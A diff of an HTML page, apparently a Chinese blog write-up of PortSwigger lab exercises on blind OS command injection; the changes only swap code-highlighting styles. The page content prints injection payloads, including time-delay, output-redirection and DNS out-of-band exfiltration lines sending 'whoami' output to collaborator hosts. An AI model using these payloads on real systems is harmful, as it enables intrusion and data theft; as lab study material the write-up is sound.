@@ -59,10 +59,6 @@
   
 
   
-    
-<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
-
-  
 
   <link
   rel="stylesheet"
@@ -70,7 +66,8 @@
   media="all"
 />
 
-</head><body>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body>
 
 
 
@@ -136,7 +133,7 @@
 <p><strong>过程：</strong></p>
 <p>用 burp 拦截数据包，有两个参数分别是产品和商店</p>
 <p>Post 设置参数，whoami 命令用于显示自身用户名称</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 &amp; <span class="hljs-built_in">whoami</span> <span class="hljs-comment">#</span><br><br>URL 编码后<br>1+%26+<span class="hljs-built_in">whoami</span>+%23<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 &amp; <span class="built_in">whoami</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">URL 编码后</span><br><span class="line">1+%26+<span class="built_in">whoami</span>+%23</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115301.png" alt="230215PM11_65"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115973.png" alt="230215PM11_66"></p>
 <h2 id="2-Blind-OS-command-injection-with-time-delays">2. Blind OS command injection with time delays</h2>
@@ -146,7 +143,7 @@
 <p>**目标：**通过 sleep 10 秒判断出问题所在</p>
 <p><strong>过程：</strong></p>
 <p>在“反馈”界面抓包处理，分别测试<code>name</code> <code>email</code>等参数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">+%26+<span class="hljs-built_in">sleep</span>+10+%23<br> &amp; <span class="hljs-built_in">sleep</span> 10 <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+%26+<span class="built_in">sleep</span>+10+%23</span><br><span class="line"> &amp; <span class="built_in">sleep</span> 10 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115098.png" alt="230216AM10_72"></p>
 <h2 id="3-Blind-OS-command-injection-with-output-redirection">3. Blind OS command injection with output redirection</h2>
 <blockquote>
@@ -159,7 +156,7 @@
 <p>可通过 F12 把 emali 的 type 改为 text，以此绕过前端检查，来提交反馈</p>
 <p>在电子邮箱处填写<code>&amp; whoami &gt; /var/www/images/ling.txt #</code>，执行 whoami 命令，将内容保存在 ling.txt</p>
 <p>访问图片网址，修改文件名成 <code>ling.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 等待十秒</span><br> &amp; <span class="hljs-built_in">sleep</span> 10 <span class="hljs-comment">#</span><br><br><span class="hljs-comment"># 将内容保存在 ling.txt</span><br>&amp; <span class="hljs-built_in">whoami</span> &gt; /var/www/images/ling.txt <span class="hljs-comment">#</span><br><br><span class="hljs-comment"># 访问</span><br>https://0ab8007b0415044bc48b9b5d001e00fb.web-security-academy.net/image?filename=ling.txt<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 等待十秒</span></span><br><span class="line"> &amp; <span class="built_in">sleep</span> 10 <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内容保存在 ling.txt</span></span><br><span class="line">&amp; <span class="built_in">whoami</span> &gt; /var/www/images/ling.txt <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">https://0ab8007b0415044bc48b9b5d001e00fb.web-security-academy.net/image?filename=ling.txt</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115701.png" alt="230216AM11_74"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115833.png" alt="230216AM11_2"></p>
 <h2 id="4-Blind-OS-command-injection-with-out-of-band-interaction">4. Blind OS command injection with out-of-band interaction</h2>
@@ -170,7 +167,7 @@
 <p><strong>过程：</strong></p>
 <p>需要 Burp pro 而不是社区版，利用 nslookup 命令去外带出回显</p>
 <p>nslookup 命令用于<strong>查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">+%26+nslookup+bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com+%23<br><br><span class="hljs-comment"># URL 解码后</span><br> &amp; nslookup bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+%26+nslookup+bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com+%23</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL 解码后</span></span><br><span class="line"> &amp; nslookup bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115140.png" alt="230216PM02_5"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115210.png" alt="230216PM02_4"></p>
 <h2 id="5-Blind-OS-command-injection-with-out-of-band-data-exfiltration">5. Blind OS command injection with out-of-band data exfiltration</h2>
@@ -178,7 +175,7 @@
 <p>带外数据泄露的盲 OS 命令注入</p>
 </blockquote>
 <p>启用 Burp Collaborator client，复制到剪贴板；拦截和修改提交反馈的请求，修改 email 参数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&amp; nslookup `<span class="hljs-built_in">whoami</span>`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com <span class="hljs-comment">#</span><br> <br>&amp; nslookup $(<span class="hljs-built_in">whoami</span>).kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com <span class="hljs-comment">#</span><br> <br>||nslookup `<span class="hljs-built_in">whoami</span>`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com||<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; nslookup `<span class="built_in">whoami</span>`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">&amp; nslookup $(<span class="built_in">whoami</span>).kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">||nslookup `<span class="built_in">whoami</span>`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com||</span><br></pre></td></tr></table></figure>
 <p>最后，在 burp 的子域名中，可以看到 DNS 交互，获得当前用户名</p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115451.png" alt="230216PM02_8"></p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Portswigger%20%E9%9D%B6%E5%9C%BA%20%7C%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/202410062115829.png" alt="230216PM02_9">0</p>
@@ -679,28 +676,16 @@
     }
   });
 </script>
-<script>
-  document.addEventListener('DOMContentLoaded', function () {
-    window.codeElements = document.querySelectorAll('.code');
-    if (window.codeElements.length > 0) {
-      ctx.copycode = {
-        default_text: `Copy`,
-        success_text: `Copied`,
-        toast: ``,
-      };
-      utils.js('/js/plugins/copycode.js');
-    }
-  });
-</script>
+
 
 
                   <!-- inject -->
                   
 
-                    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+                    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
                     <script>
                       hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
-                    </script><script src="/js/plugins/copycode.js"></script>
+                    </script> --><script src="/js/plugins/copycode.js"></script>
     <script type="text/javascript" 
       color="220,220,220" 
       opacity="0.7" 
